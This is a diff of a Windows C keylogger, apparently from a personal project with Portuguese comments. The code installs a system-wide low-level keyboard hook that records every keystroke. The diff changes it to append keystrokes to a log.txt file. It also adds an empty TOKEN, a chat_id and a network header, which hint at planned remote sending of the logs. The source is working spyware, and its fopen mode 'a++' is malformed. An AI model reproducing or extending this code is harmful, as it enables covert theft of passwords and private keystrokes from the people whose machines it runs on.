@@ -1,13 +1,11 @@
-
-#include <stdlib.h>
-#include <windows.h>
-#include <stdio.h>
-#include <winsock.h>
-#include <winsock2.h>
-
-
-
-
+    #include <stdlib.h>
+    #include <windows.h>
+    #include <stdio.h>
+    #include <winsock.h>
+    #include <winsock2.h>
+    #include "network.h"
+    #define TOKEN ""
+    #define chat_id ""
 
 
 
@@ -16,93 +14,96 @@
 
 
 
-
-LRESULT CALLBACK hook(int codigo, WPARAM c, LPARAM
-
-    d)
-
-{
+    FILE *log;
 
 
+    LRESULT CALLBACK hook(int codigo, WPARAM c, LPARAM
 
-    if (codigo == HC_ACTION)
+        d)
 
     {
 
-        switch (c)
+
+
+        if (codigo == HC_ACTION)
 
         {
 
-            case WM_KEYDOWN:
+            switch (c)
 
-            case WM_SYSKEYDOWN:
+            {
 
-           // case WM_KEYUP:
+                case WM_KEYDOWN:
 
-            case WM_SYSKEYUP:
+                case WM_SYSKEYDOWN:
 
-                {
+               // case WM_KEYUP:
 
-                    PKBDLLHOOKSTRUCT m = (PKBDLLHOOKSTRUCT) d;
+                case WM_SYSKEYUP:
 
-                    printf("%c", m->vkCode);
+                    {
 
-                    break;
+                        PKBDLLHOOKSTRUCT m = (PKBDLLHOOKSTRUCT) d;
 
-                }
+                        fprintf(log,"%c", m->vkCode);
+
+                        break;
+
+                    }
+
+            }
 
         }
 
+        return( CallNextHookEx(NULL, codigo, c,
+
+            d));
+
     }
 
-    return( CallNextHookEx(NULL, codigo, c,
 
-        d));
-
-}
-
-
-void loopmessage(){
-    MSG  msg;
-    BOOL bRet;
-    GetMessage( &msg, NULL, 0, 0 );
-   while( (bRet = GetMessage( &msg, NULL, 0, 0 )) != 0)
-{
-    if (bRet == -1)
+    void loopmessage(){
+        MSG  msg;
+        BOOL bRet;
+        GetMessage( &msg, NULL, 0, 0 );
+       while( (bRet = GetMessage( &msg, NULL, 0, 0 )) != 0)
     {
-        // handle the error and possibly exit
+        if (bRet == -1)
+        {
+            // handle the error and possibly exit
+        }
+        else
+        {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
     }
-    else
-    {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
+
+
     }
-}
-
-
-}
-DWORD WINAPI hook_injection(){
-HINSTANCE  i=GetModuleHandle(NULL);  //recupera um um indentificador para uma janela
-HHOOK k =SetWindowsHookEx(WH_KEYBOARD_LL,hook,i,0);//Funçao de gancho para uma janela qualquer que recupera o estado das teclas digitadas
-loopmessage();// loop de mensagens
-UnhookWindowsHookEx(k);
-return 0;
-}
-
-
-int main(){
-
-DWORD w;
- HANDLE l=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)hook_injection,NULL,0,&w);
-if(l){
-    return WaitForSingleObject(l,INFINITE);
-
-}
-else{
-
-    return 1;
-}
-
-
+    DWORD WINAPI hook_injection(){
+    HINSTANCE  i=GetModuleHandle(NULL);  //recupera um um indentificador para uma janela
+    HHOOK k =SetWindowsHookEx(WH_KEYBOARD_LL,hook,i,0);//FunÃ§ao de gancho para uma janela qualquer que recupera o estado das teclas digitadas
+    loopmessage();// loop de mensagens
+    UnhookWindowsHookEx(k);
     return 0;
-}
+    }
+
+
+    int main(){
+
+    DWORD w;
+    log=fopen("log.txt","a++");
+     HANDLE l=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)hook_injection,NULL,0,&w);
+    if(l){
+        return WaitForSingleObject(l,INFINITE);
+
+    }
+    else{
+    fclose(log);
+        return 1;
+    }
+
+
+        return 0;
+    }
